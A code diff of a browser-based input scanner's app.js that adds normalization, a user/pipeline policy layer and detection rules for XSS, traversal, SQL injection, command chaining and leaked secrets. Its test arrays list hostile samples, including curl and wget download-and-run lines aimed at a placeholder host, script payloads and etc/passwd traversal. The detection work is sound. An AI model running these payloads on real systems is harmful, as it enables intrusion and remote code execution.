@@ -1,62 +1,62 @@
-// app.js — NORMALIZATION + SECRETS (Freeze v3)
-// Drop-in replacement for your current app.js
+// app.js
 (() => {
   "use strict";
 
-  const BUILD = "v2026-01-05_normalizer_v3_secrets_freeze";
-
-  // Policy toggle (default: keep secrets as WARN, not BLOCK)
-  const STRICT_SECRETS = false;
-
+  const BUILD = "v2026-01-05_normalization_v3_policy_secrets_freeze";
   const nowISO = () => new Date().toISOString();
-  const $ = (id) => document.getElementById(id);
+
+  function $(id) { return document.getElementById(id); }
 
   function safeOn(el, evt, fn) {
     if (!el) return;
     el.addEventListener(evt, fn, { passive: true });
   }
 
-  // -----------------------------
-  // NORMALIZATION (core)
-  // هدفها: نفس المدخل، مهما كان ترميزه (%2f/%252f/Backslashes/Mixed case) => نفس النتيجة
-  // -----------------------------
-  function safeDecodeURIComponentOnce(s) {
-    try {
-      // لا نفك "+" إلى مسافة لأن هذا يسبب false positives في كثير من logs
-      return decodeURIComponent(s);
-    } catch {
-      return s;
-    }
+  // ----------------------------
+  // Normalization (v3)
+  // ----------------------------
+  function tryDecodeURIComponentSafe(s) {
+    try { return decodeURIComponent(s); } catch { return s; }
   }
 
-  function normalizeInput(raw) {
-    let s = (raw || "").trim();
-    if (!s) return { raw: "", norm: "" };
-
-    // 1) unify slashes early
-    s = s.replace(/\\/g, "/");
-
-    // 2) iterative percent-decode (handles %252f => %2f => /)
-    // limit iterations to avoid pathological loops
-    for (let i = 0; i < 3; i++) {
-      const d = safeDecodeURIComponentOnce(s);
-      if (d === s) break;
-      s = d;
+  // Decode multiple times to handle double-encoding like ..%252f..%252f
+  function decodeMulti(s, rounds = 3) {
+    let out = s;
+    for (let i = 0; i < rounds; i++) {
+      const next = tryDecodeURIComponentSafe(out);
+      if (next === out) break;
+      out = next;
     }
-
-    // 3) collapse repeated slashes in paths (not protocol "https://")
-    s = s.replace(/([^:])\/{2,}/g, "$1/");
-
-    // 4) remove invisible/control chars that mess with comparisons
-    s = s.replace(/[\u0000-\u001F\u007F]/g, "");
-
-    // 5) keep a lowercased shadow string for matching (we will use normLower for tests)
-    return { raw, norm: s };
+    return out;
   }
 
-  // -----------------------------
-  // Metrics
-  // -----------------------------
+  function normalizeLine(raw) {
+    let s = (raw ?? "").toString();
+
+    // Trim + normalize whitespace
+    s = s.replace(/\r/g, "").trim().replace(/\s+/g, " ");
+
+    // Decode percent-encoding multiple times
+    s = decodeMulti(s, 3);
+
+    // Normalize backslashes to slashes for path detection (but keep original decision context)
+    // This helps detect Windows paths even if mixed.
+    const s2 = s.replace(/\\+/g, "\\"); // compress
+    const s3 = s2.replace(/\\+/g, "\\"); // stable
+
+    return s3;
+  }
+
+  function parseInputLines(txt) {
+    return (txt || "")
+      .split(/\r?\n/)
+      .map(s => normalizeLine(s))
+      .filter(Boolean);
+  }
+
+  // ----------------------------
+  // Utilities
+  // ----------------------------
   function shannonEntropy(str) {
     if (!str) return 0;
     const freq = new Map();
@@ -74,198 +74,184 @@
     return /^https?:\/\//i.test(s) || /^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(s);
   }
 
-  function classifyType(normStr) {
-    const x = (normStr || "").trim();
+  function classifyType(s) {
+    const x = (s || "").trim();
     if (!x) return "Data";
 
     const isURL = looksLikeURL(x) || /(^|[?&])(url|next|returnurl|redirect_uri)=/i.test(x);
 
-    // ملاحظة: نستخدم normalized string هنا لتقليل bypass
     const isExploit =
-      /<script|onerror=|onload=|javascript:|data:text\/html|(\.\.\/){2,}|\/windows\/system32|union\s+select|1=1|--\s*$|\b(wget|curl)\b.*\bhttps?:\/\/|powershell\s+-enc/i.test(x);
+      /<script|onerror=|onload=|javascript:|data:text\/html|(\.\.\/){2,}|\\windows\\system32|union\s+select|1=1|--\s*$|wget\s+http|curl\s+-s|powershell\s+-enc/i.test(x);
 
     if (isExploit) return "Exploit";
     if (isURL) return "URL";
     return "Data";
   }
 
-  // -----------------------------
-  // RULES (now run against normalized+lower)
-  // -----------------------------
+  // ----------------------------
+  // Rules (Detection)
+  // ----------------------------
   const RULES = [
-    // Redirect/open-redirect patterns
+    // Redirect/open-redirect
     {
       label: "REDIRECT_PARAM",
-      test: (s) =>
-        /(^|[?&])(redirect_uri|redirect|returnurl|returnUrl|next|url)=/i.test(s) ||
-        /\b(returnUrl|next)=\/\/[^ \n]+/i.test(s),
-      sev: 55,
-      conf: 90,
+      test: s => /(^|[?&])(redirect_uri|redirect|returnurl|returnUrl|next|url)=/i.test(s) || /\b(returnUrl|next)=\/\/[^ \n]+/i.test(s),
+      sev: 55, conf: 90
     },
-
-    // Auth endpoints (context)
     {
       label: "AUTH_ENDPOINT",
-      test: (s) =>
-        /(oauth\/authorize|oauth2\/authorize|\/signin\/oauth|login\.microsoftonline\.com\/common\/oauth2\/authorize)/i.test(s),
-      sev: 45,
-      conf: 80,
+      test: s => /(oauth\/authorize|oauth2\/authorize|\/signin\/oauth|login\.microsoftonline\.com\/common\/oauth2\/authorize)/i.test(s),
+      sev: 45, conf: 80
     },
 
-    // Secrets (NEW)
-    {
-      label: "SECRET:AWS_ACCESS_KEY",
-      test: (s) => /\bAKIA[0-9A-Z]{16}\b/.test(s),
-      sev: 65,
-      conf: 90,
-      kind: "secret",
-    },
-    {
-      label: "SECRET:PRIVATE_KEY_BLOCK",
-      test: (s) =>
-        /-----BEGIN (?:RSA |EC |OPENSSH |)?PRIVATE KEY-----/i.test(s) ||
-        /-----END (?:RSA |EC |OPENSSH |)?PRIVATE KEY-----/i.test(s),
-      sev: 80,
-      conf: 95,
-      kind: "secret",
-    },
-    {
-      label: "SECRET:BEARER_TOKEN",
-      test: (s) => /\bauthorization:\s*bearer\s+[A-Za-z0-9._\-+/=]{8,}/i.test(s),
-      sev: 60,
-      conf: 85,
-      kind: "secret",
-    },
-    {
-      label: "SECRET:JWT_LIKE",
-      test: (s) => /\beyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\b/.test(s),
-      sev: 55,
-      conf: 80,
-      kind: "secret",
-    },
-
-    // Base64 HTML (kept)
+    // Obfuscation / encoding
     {
       label: "BASE64_DECODE",
-      test: (s) => /(data:text\/html;base64,)/i.test(s),
-      sev: 35,
-      conf: 70,
+      test: s => /(data:text\/html;base64,)/i.test(s),
+      sev: 35, conf: 70
     },
-
-    // Obfuscation / encoding hints
     {
       label: "OBFUSCATION",
-      test: (s) =>
-        /%2f|%3a|%3d|%5c|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}|[A-Za-z0-9+\/]{30,}={0,2}/i.test(s),
-      sev: 35,
-      conf: 67,
+      test: s =>
+        /%2f|%3a|%3d|%5c|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}/i.test(s) ||
+        /[A-Za-z0-9+\/]{40,}={0,2}/.test(s),
+      sev: 35, conf: 67
     },
-
-    // Homograph / punycode
     {
       label: "HOMOGRAPH_RISK",
-      test: (s) => /\bxn--/i.test(s),
-      sev: 60,
-      conf: 70,
+      test: s => /\bxn--/i.test(s),
+      sev: 60, conf: 70
     },
 
-    // XSS / JS execution
+    // XSS / JS
     {
       label: "XSS/JS_SCRIPT",
-      test: (s) =>
-        /<script|onerror=|onload=|javascript:|data:text\/html|<img[^>]+onerror=|<svg[^>]+onload=/i.test(s),
-      sev: 85,
-      conf: 85,
+      test: s => /<script|onerror=|onload=|javascript:|data:text\/html|<img[^>]+onerror=|<svg[^>]+onload=/i.test(s),
+      sev: 85, conf: 85
     },
 
-    // LFI (FIXED: normalized catches encoded traversal too)
+    // LFI paths (post-normalization catches decoded forms)
     {
       label: "LFI:ETC_PASSWD",
-      test: (s) =>
-        /(\.\.\/){2,}etc\/passwd/i.test(s) ||
-        /etc\/passwd/i.test(s) ||
-        /\/windows\/system32\/drivers\/etc\/hosts/i.test(s),
-      sev: 80,
-      conf: 75,
+      test: s => /(\.\.\/){2,}etc\/passwd|etc\/passwd|windows\\system32\\drivers\\etc\\hosts|C:\\Windows\\System32\\drivers\\etc\\hosts/i.test(s),
+      sev: 80, conf: 75
     },
 
-    // Command chaining (FIXED: avoid matching "data:text/html;base64")
+    // Command chaining
     {
       label: "CMD:CMD_CHAIN",
-      test: (s) =>
-        /(?:^|\s)(?:&&|\|\|)\s*\w+/i.test(s) ||
-        /(?:^|\s)[;|]\s*\w+/i.test(s) ||
-        /\bpowershell\s+-enc\b/i.test(s),
-      sev: 85,
-      conf: 85,
+      test: s => /(&&|\|\|)\s*\w+|;\s*\w+|\|\s*\w+|powershell\s+-enc/i.test(s),
+      sev: 85, conf: 85
     },
-
-    // Download/execution
     {
       label: "DOWNLOAD_TOOL",
-      test: (s) => /\b(wget|curl)\b.*\bhttps?:\/\/.*(\|\s*(sh|bash)|-O-|\|\s*sh)/i.test(s),
-      sev: 90,
-      conf: 90,
+      test: s => /\b(wget|curl)\b.*\b(http|https):\/\/.*(\|\s*(sh|bash)|-O-|\|\s*sh)/i.test(s),
+      sev: 90, conf: 90
     },
 
     // SQLi
     {
       label: "SQL:SQLI_TAUTOLOGY",
-      test: (s) =>
-        /(1\s*=\s*1(\s*or\s*1\s*=\s*1)?|'\s*or\s*'1'\s*=\s*'1|admin'\s*--|select\s+\*\s+from\s+\w+\s+where)/i.test(s),
-      sev: 75,
-      conf: 85,
+      test: s => /(1\s*=\s*1(\s*or\s*1\s*=\s*1)?|'\s*or\s*'1'\s*=\s*'1|admin'\s*--|select\s+\*\s+from\s+\w+\s+where)/i.test(s),
+      sev: 75, conf: 85
     },
     {
       label: "SQL:SQLI_UNION_ALL",
-      test: (s) => /union\s+select/i.test(s),
-      sev: 80,
-      conf: 80,
+      test: s => /union\s+select/i.test(s),
+      sev: 80, conf: 80
     },
+
+    // ----------------------------
+    // Secrets (NEW)
+    // ----------------------------
+    {
+      label: "SECRET:BEARER_TOKEN",
+      test: s => /\bAuthorization:\s*Bearer\s+[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\b/i.test(s) || /\bBearer\s+[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\b/i.test(s),
+      sev: 65, conf: 85
+    },
+    {
+      label: "SECRET:AWS_ACCESS_KEY",
+      test: s => /\bAKIA[0-9A-Z]{16}\b/.test(s),
+      sev: 70, conf: 90
+    },
+    {
+      label: "SECRET:PRIVATE_KEY_BLOCK",
+      test: s => /-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----/i.test(s) || /-----END (RSA |EC |OPENSSH )?PRIVATE KEY-----/i.test(s),
+      sev: 75, conf: 95
+    }
   ];
 
-  function analyzeOne(input) {
-    const { raw, norm } = normalizeInput((input || "").trim());
-    const s = (norm || "").trim();
+  function detectHits(input) {
+    const s = (input || "").trim();
     const hits = [];
-
     for (const r of RULES) {
-      if (r.test(s)) hits.push({ label: r.label, sev: r.sev, conf: r.conf, kind: r.kind || "signal" });
+      if (r.test(s)) hits.push({ label: r.label, sev: r.sev, conf: r.conf });
     }
+    return hits;
+  }
 
-    let severity = 0,
-      confidence = 0;
+  // ----------------------------
+  // Policy Layer (NEW)
+  // ----------------------------
+  // Detection stays the same; only decision thresholds change per policy.
+  const POLICIES = {
+    USER: {
+      name: "USER",
+      // Block only when truly high-risk (XSS, download+cmd, explicit JS schemes)
+      blockSev: 85,
+      warnSev: 55,
+      // Secrets default to WARN (not BLOCK) in USER mode
+      secretsForceWarn: true
+    },
+    PIPELINE: {
+      name: "PIPELINE",
+      // Stricter: block on high-risk + sensitive secrets if desired
+      blockSev: 80,
+      warnSev: 55,
+      secretsForceWarn: false // allow secrets to reach BLOCK by severity
+    }
+  };
+
+  function isSecretLabel(label) {
+    return label.startsWith("SECRET:");
+  }
+
+  function decideFromHits(hits, policy) {
+    let severity = 0, confidence = 0;
     if (hits.length) {
-      severity = Math.max(...hits.map((h) => h.sev));
-      confidence = Math.max(...hits.map((h) => h.conf));
+      severity = Math.max(...hits.map(h => h.sev));
+      confidence = Math.max(...hits.map(h => h.conf));
     }
 
-    // Decision logic
+    // Base decision
     let decision = "ALLOW";
 
-    const hasBlockSignal = hits.some((h) => h.sev >= 85) || hits.some((h) => h.label === "DOWNLOAD_TOOL");
-    const hasWarnSignal = hits.some((h) => h.sev >= 55);
+    // If secretsForceWarn, clamp secret-only cases to WARN
+    const hasOnlySecrets = hits.length > 0 && hits.every(h => isSecretLabel(h.label));
+    const hasAnySecret = hits.some(h => isSecretLabel(h.label));
 
-    // Secrets policy
-    const hasSecret = hits.some((h) => h.kind === "secret");
+    // Hard blocks for explicit dangerous behaviors regardless of policy
+    const hardBlock = hits.some(h => h.label === "DOWNLOAD_TOOL") || hits.some(h => h.label === "XSS/JS_SCRIPT");
 
-    if (hasBlockSignal) decision = "BLOCK";
-    else if (STRICT_SECRETS && hasSecret) decision = "BLOCK";
-    else if (hasWarnSignal || hasSecret) decision = "WARN";
+    if (hardBlock || hits.some(h => h.sev >= policy.blockSev)) decision = "BLOCK";
+    else if (hits.some(h => h.sev >= policy.warnSev)) decision = "WARN";
 
+    if (policy.secretsForceWarn && (hasOnlySecrets || (hasAnySecret && decision === "BLOCK" && !hardBlock))) {
+      decision = "WARN";
+    }
+
+    return { decision, severity, confidence };
+  }
+
+  function analyzeOne(input, policy) {
+    const s = (input || "").trim();
+    const hits = detectHits(s);
+
+    const { decision, severity, confidence } = decideFromHits(hits, policy);
     const type = classifyType(s);
-    const entropy = shannonEntropy(raw || s);
+    const entropy = shannonEntropy(s);
 
-    return {
-      input: (raw || "").trim(),
-      normalized: s,
-      type,
-      decision,
-      severity,
-      confidence,
-      entropy,
-      hits: hits.map(({ label, sev, conf }) => ({ label, sev, conf })),
-    };
+    return { input: s, type, decision, severity, confidence, entropy, hits };
   }
 
   function verdictFrom(rows) {
@@ -276,8 +262,8 @@
       else counts.block++;
     }
 
-    const peakSeverity = rows.length ? Math.max(...rows.map((r) => r.severity)) : 0;
-    const confidence = rows.length ? Math.max(...rows.map((r) => r.confidence)) : 0;
+    const peakSeverity = rows.length ? Math.max(...rows.map(r => r.severity)) : 0;
+    const confidence = rows.length ? Math.max(...rows.map(r => r.confidence)) : 0;
 
     let verdict = "SECURE";
     if (counts.block > 0) verdict = "DANGER";
@@ -288,24 +274,24 @@
       for (const h of r.hits) sigMap.set(h.label, (sigMap.get(h.label) || 0) + 1);
     }
     const signals = [...sigMap.entries()]
-      .sort((a, b) => b[1] - a[1])
-      .map(([label, count]) => ({ label, count }));
+      .sort((a,b) => b[1]-a[1])
+      .map(([label,count]) => ({ label, count }));
 
     return { verdict, peakSeverity, confidence, counts, signals };
   }
 
-  function buildReport(rows) {
+  function buildReport(rows, policyName) {
     const meta = verdictFrom(rows);
     return {
       generatedAt: nowISO(),
       build: BUILD,
-      policy: { STRICT_SECRETS },
+      policy: policyName,
       verdict: meta.verdict,
       peakSeverity: meta.peakSeverity,
       confidence: meta.confidence,
       counts: meta.counts,
       signals: meta.signals,
-      rows,
+      rows
     };
   }
 
@@ -317,11 +303,9 @@
     verdictText.textContent = meta.verdict;
 
     box.style.borderColor =
-      meta.verdict === "DANGER"
-        ? "rgba(239,68,68,.35)"
-        : meta.verdict === "SUSPICIOUS"
-        ? "rgba(245,158,11,.35)"
-        : "rgba(45,212,191,.25)";
+      meta.verdict === "DANGER" ? "rgba(239,68,68,.35)" :
+      meta.verdict === "SUSPICIOUS" ? "rgba(245,158,11,.35)" :
+      "rgba(45,212,191,.25)";
 
     $("peakSev").textContent = `Peak severity: ${meta.peakSeverity}%`;
     $("peakConf").textContent = `Confidence: ${meta.confidence}%`;
@@ -369,7 +353,7 @@
       const tr = document.createElement("div");
       tr.className = "trow";
 
-      const dotClass = r.decision === "ALLOW" ? "ok" : r.decision === "WARN" ? "warn" : "bad";
+      const dotClass = r.decision === "ALLOW" ? "ok" : (r.decision === "WARN" ? "warn" : "bad");
 
       const c1 = document.createElement("div");
       c1.className = "mono";
@@ -395,54 +379,87 @@
       const c6 = document.createElement("div");
       c6.textContent = String(r.entropy);
 
-      tr.append(c1, c2, c3, c4, c5, c6);
+      tr.append(c1,c2,c3,c4,c5,c6);
       host.appendChild(tr);
     }
   }
 
-  function parseInputLines(txt) {
-    return (txt || "")
-      .split(/\r?\n/)
-      .map((s) => s.trim())
-      .filter(Boolean);
-  }
-
-  // -----------------------------
-  // TESTS (Updated to verify normalization + secrets)
-  // -----------------------------
+  // ----------------------------
+  // Tests (keep as-is, normalization will improve results)
+  // ----------------------------
   const TEST_A = [
     "hello world",
     "https://example.com/",
-    "https://good.com/redirect?next=https%3A%2F%2Fevil.com", // should still WARN (redirect + obfuscation)
-    "..%252f..%252f..%252f..%252fetc%252fpasswd",           // MUST WARN now (normalization => ../../../../etc/passwd)
-    "C:\\Windows\\System32\\drivers\\etc\\hosts",           // MUST WARN (LFI windows path normalized)
-    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", // BLOCK (XSS), and NOT CMD false-positive
-    "; ls -la",                                             // BLOCK (cmd chain)
-    "wget http://evl1.tld/a.sh -O- | sh",                   // BLOCK (download tool)
-    "UNION SELECT username,password FROM users",            // WARN (SQL union)
-    "Authorization: Bearer abc.def.ghi",                    // WARN (secret bearer)
-    "AKIAIOSFODNN7EXAMPLE",                                 // WARN (AWS key)
-    "-----BEGIN PRIVATE KEY-----",                           // WARN (secret key block)
+    "https://accounts.google.com/signin/oauth/authorize?redirect_uri=https://evil.com",
+    "https://login.microsoftonline.com/common/oauth2/authorize?redirect_uri=https://evl1.com",
+    "http://xn--pple-43d.com/login",
+    "http://paypaI.com/security",
+    "http://micros0ft.com/account/verify",
+    "https://good.com/redirect?url=https://evil.com",
+    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
+    "redirect_uri=https://evil.com",
+    "returnUrl=//evil.com",
+    "next=//evil.com",
+    "url=javascript:alert(1)",
+    "<svg onload=alert(1)>",
+    "\"><script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "javascript:alert(1)",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "../../../../etc/passwd",
+    "..%252f..%252f..%252f..%252fetc%252fpasswd",
+    "C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "; ls -la",
+    "| whoami",
+    "&& curl http://evl1.tld/payload.sh | sh",
+    "powershell -enc SQBFAFgA",
+    "SELECT * FROM users WHERE 1=1 OR 1=1",
+    "' OR '1'='1",
+    "admin'--",
+    "UNION SELECT username,password FROM users",
+    "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload\"}",
+    "Authorization: Bearer abc.def.ghi",
+    "AKIAIOSFODNN7EXAMPLE",
+    "-----BEGIN PRIVATE KEY-----",
+    "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC...",
+    "-----END PRIVATE KEY-----",
+    "{\"op\":\"add\",\"path\":\"/admin\",\"value\":true}",
+    "wget http://evl1.tld/a.sh -O- | sh",
+    "curl -s http://evl1.tld/a | bash",
+    "<script src=https://static.cloudflareinsights.com/beacon.min.js></script>"
   ];
 
   const TEST_B = [
     "hello world",
     "https://example.com/",
-    "..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
+    "returnUrl=//evil.com",
     "url=javascript:alert(1)",
+    "<img src=x onerror=alert(1)>",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "../../../../etc/passwd",
+    "C:\\Windows\\System32\\drivers\\etc\\hosts",
     "&& curl http://evl1.tld/payload.sh | sh",
-    "-----BEGIN PRIVATE KEY-----",
+    "UNION SELECT username,password FROM users",
+    "powershell -enc SQBFAFgA"
   ];
 
   let lastReport = null;
+
+  function getPolicy() {
+    const sel = $("policyMode");
+    const v = sel ? sel.value : "USER";
+    return POLICIES[v] || POLICIES.USER;
+  }
 
   function runScanFromTextarea() {
     const inputEl = $("input");
     if (!inputEl) return;
 
+    const policy = getPolicy();
     const lines = parseInputLines(inputEl.value);
-    const rows = lines.map(analyzeOne);
-    const report = buildReport(rows);
+    const rows = lines.map(x => analyzeOne(x, policy));
+    const report = buildReport(rows, policy.name);
 
     lastReport = report;
 
@@ -451,7 +468,7 @@
       peakSeverity: report.peakSeverity,
       confidence: report.confidence,
       counts: report.counts,
-      signals: report.signals,
+      signals: report.signals
     });
 
     renderRows(report.rows);
@@ -484,7 +501,7 @@
       peakSeverity: 0,
       confidence: 0,
       counts: { scans: 0, allow: 0, warn: 0, block: 0 },
-      signals: [],
+      signals: []
     });
 
     renderRows([]);
@@ -516,7 +533,7 @@
       peakSeverity: 0,
       confidence: 0,
       counts: { scans: 0, allow: 0, warn: 0, block: 0 },
-      signals: [],
+      signals: []
     });
 
     safeOn($("btnLoadA"), "click", () => loadTest(TEST_A));
@@ -527,9 +544,15 @@
     safeOn($("btnInfo"), "click", openInfo);
     safeOn($("btnCloseInfo"), "click", closeInfo);
 
-    console.log(`[Validoon] ${BUILD} loaded. Local-only. No network. STRICT_SECRETS=${STRICT_SECRETS}`);
+    // Re-scan if policy changes
+    safeOn($("policyMode"), "change", runScanFromTextarea);
+
+    console.log(`[Validoon] ${BUILD} loaded. Policy=${getPolicy().name}. Local-only. No network.`);
   }
 
-  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
-  else boot();
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", boot);
+  } else {
+    boot();
+  }
 })();
